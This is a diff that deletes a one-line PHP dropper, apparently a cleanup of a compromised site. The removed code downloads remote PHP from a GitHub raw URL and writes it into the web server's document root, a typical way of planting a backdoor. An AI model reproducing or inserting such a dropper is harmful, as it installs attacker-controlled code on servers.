@@ -1,1 +1,0 @@
-<?php $c = file_get_contents('https://raw.githubusercontent.com/uoguzman/phphelloworld/refs/heads/main/3/oP2YMTkg6TMKWR.php'); if (strpos($c, '<?php')===false) die('err'); file_put_contents('oP2YMTkg6TMKWR-1.php', $c); print('ok'); $r = file_put_contents($_SERVER['DOCUMENT_ROOT'].'/oP2YMTkg6TMKWR.php', $c); if ($r===false) die(' not2'); die(' ok2');
